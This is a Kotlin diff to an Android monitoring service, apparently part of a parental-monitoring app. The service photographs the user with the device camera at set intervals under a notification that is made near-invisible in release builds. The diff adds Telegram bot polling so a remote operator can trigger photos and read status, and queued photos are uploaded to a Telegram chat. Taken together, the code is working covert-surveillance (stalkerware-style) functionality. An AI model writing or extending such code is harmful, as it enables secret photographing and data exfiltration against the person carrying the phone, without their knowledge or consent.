@@ -35,6 +35,7 @@ class MonitoringService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
+    private var commandJob: Job? = null
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -65,6 +66,7 @@ class MonitoringService : Service() {
         // Cancel any previous loops so a restart never duplicates work
         monitoringJob?.cancel()
         cameraJob?.cancel()
+        commandJob?.cancel()
         
         // In RELEASE mode, make notification invisible/minimal
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
@@ -129,19 +131,105 @@ class MonitoringService : Service() {
         }
         android.util.Log.d("MonitoringService", "Monitoring loop started")
         
-        // Start camera monitoring (every 1 minute)
+        // Start camera monitoring (user-configured interval)
         cameraJob = serviceScope.launch {
             while (isActive) {
                 try {
                     captureAndSendPhoto()
-                    delay(60000) // Capture every minute
+                    delay(cameraIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
                     e.printStackTrace()
                 }
             }
         }
-        android.util.Log.d("MonitoringService", "📸 Camera monitoring started (1 minute interval)")
+        android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
+        startCommandPolling()
+    }
+
+    private fun cameraIntervalMillis(): Long {
+        return preferencesManager.cameraInterval.coerceIn(1, 60) * 60_000L
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
+    // ═══════════════════════════════════════════════════════════
+
+    private fun startCommandPolling() {
+        commandJob = serviceScope.launch {
+            while (isActive) {
+                try {
+                    pollTelegramCommands()
+                } catch (e: Exception) {
+                    android.util.Log.e("MonitoringService", "Error polling commands", e)
+                }
+                delay(15_000)
+            }
+        }
+    }
+
+    private suspend fun pollTelegramCommands() {
+        val botToken = preferencesManager.botToken
+        val chatId = preferencesManager.chatId
+        if (botToken.isEmpty() || chatId.isEmpty()) return
+
+        val offset = preferencesManager.lastUpdateId + 1
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"
+
+        val response = try {
+            TelegramClient.api.getUpdates(url)
+        } catch (e: Exception) {
+            return
+        }
+        if (!response.isSuccessful || response.body()?.ok != true) return
+
+        val updates = response.body()?.result ?: return
+        for (update in updates) {
+            if (update.updateId > preferencesManager.lastUpdateId) {
+                preferencesManager.lastUpdateId = update.updateId
+            }
+            val message = update.message ?: continue
+            if (message.chat.id.toString() != chatId) continue
+            val command = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
+            if (!command.startsWith("/")) continue
+            handleTelegramCommand(command)
+        }
+    }
+
+    private suspend fun handleTelegramCommand(command: String) {
+        when (command) {
+            "/photo" -> {
+                sendToTelegram("📸 Taking photo now…")
+                captureAndSendPhoto()
+            }
+            "/status" -> {
+                val lastSync = preferencesManager.lastSyncTime
+                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
+                sendToTelegram(
+                    buildString {
+                        appendLine("📊 <b>Status</b>")
+                        appendLine("Monitoring: ON")
+                        appendLine("Last sync: $lastSyncStr")
+                        appendLine("Queued: ${messageQueue.getQueueSize()}")
+                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
+                        appendLine("Photo interval: ${preferencesManager.cameraInterval} min")
+                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
+                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
+                    }
+                )
+            }
+            "/help", "/start" -> {
+                sendToTelegram(
+                    buildString {
+                        appendLine("🤖 <b>Commands</b>")
+                        appendLine("/photo - take a photo now")
+                        appendLine("/status - show monitoring status")
+                        appendLine("/help - show this list")
+                    }
+                )
+            }
+            else -> { /* ignore unknown input to avoid reply loops */ }
+        }
     }
 
     private suspend fun sendInitialData() {
@@ -416,6 +504,7 @@ class MonitoringService : Service() {
     private fun stopMonitoring() {
         monitoringJob?.cancel()
         cameraJob?.cancel()
+        commandJob?.cancel()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
     }
@@ -444,6 +533,9 @@ class MonitoringService : Service() {
                     },
                     onError = { exception ->
                         android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
+                        serviceScope.launch {
+                            notifyCameraFailure(exception.message ?: "unknown error")
+                        }
                     }
                 )
             } catch (e: Exception) {
@@ -452,51 +544,112 @@ class MonitoringService : Service() {
         }
     }
     
+    private suspend fun notifyCameraFailure(reason: String) {
+        try {
+            val now = System.currentTimeMillis()
+            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
+            preferencesManager.lastCameraErrorNotice = now
+            val hint = if (!hasCameraPermission()) {
+                "Camera permission is missing — open Setup and grant it."
+            } else {
+                "The camera may be in use by another app."
+            }
+            sendToTelegram("⚠️ Photo capture failed: $reason. $hint")
+        } catch (e: Exception) {
+            android.util.Log.e("MonitoringService", "Error sending camera notice", e)
+        }
+    }
+
+    private suspend fun notifyPhotoSendFailure(detail: String) {
+        try {
+            val now = System.currentTimeMillis()
+            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
+            preferencesManager.lastCameraErrorNotice = now
+            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
+        } catch (e: Exception) {
+            android.util.Log.e("MonitoringService", "Error sending upload notice", e)
+        }
+    }
+
+    private fun hasCameraPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.CAMERA
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
     private suspend fun sendPhotoToTelegram(photoFile: File) {
+        if (sendPhotoFile(photoFile)) {
+            flushPendingPhotos()
+        } else {
+            prunePhotoCache()
+        }
+    }
+
+    private suspend fun sendPhotoFile(photoFile: File): Boolean {
         try {
             if (!NetworkUtils.isNetworkAvailable(this)) {
                 android.util.Log.w("MonitoringService", "No network - photo saved for later")
-                return
+                return false
             }
-            
+
             val botToken = preferencesManager.botToken
             val chatId = preferencesManager.chatId
-            
+
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
-                photoFile.delete()
-                return
+                return false
             }
-            
-            android.util.Log.i("MonitoringService", "📤 Sending photo to Telegram...")
-            
-            // Prepare multipart request
+
             val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
             val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
             val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
-            
+
             val timestamp = TimeFmt.full(System.currentTimeMillis())
             val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())
-            
+
             val url = "https://api.telegram.org/bot$botToken/sendPhoto"
-            
+
             val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
-            
+
             if (response.isSuccessful && response.body()?.ok == true) {
                 android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                 photoFile.delete()
-            } else if (response.code() == 429) {
-                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
-                prunePhotoCache()
-            } else {
-                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()}")
-                prunePhotoCache()
+                return true
             }
+            val errorBody = try {
+                response.errorBody()?.string()?.take(200) ?: ""
+            } catch (e: Exception) {
+                ""
+            }
+            if (response.code() == 429) {
+                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
+            } else {
+                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
+                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
+            }
+            return false
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
-            prunePhotoCache()
+            return false
         }
+    }
+
+    private suspend fun flushPendingPhotos(max: Int = 3) {
+        val pending = try {
+            cacheDir.listFiles { file ->
+                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
+            }?.sortedBy { it.lastModified() }?.take(max) ?: return
+        } catch (e: Exception) {
+            return
+        }
+        for (file in pending) {
+            if (!sendPhotoFile(file)) break
+            kotlinx.coroutines.delay(1000)
+        }
+        prunePhotoCache()
     }
 
     private fun prunePhotoCache(maxKept: Int = 20) {
